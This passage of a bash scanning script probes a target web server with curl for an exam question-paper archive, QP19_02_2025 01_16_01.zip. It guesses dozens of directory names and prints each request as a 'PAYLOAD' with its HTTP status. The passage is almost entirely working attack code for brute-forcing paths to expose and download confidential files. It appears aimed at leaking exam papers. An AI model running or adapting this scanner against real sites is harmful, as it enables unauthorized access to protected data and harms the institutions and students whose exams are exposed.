${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFilePlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFilePlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFilePlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
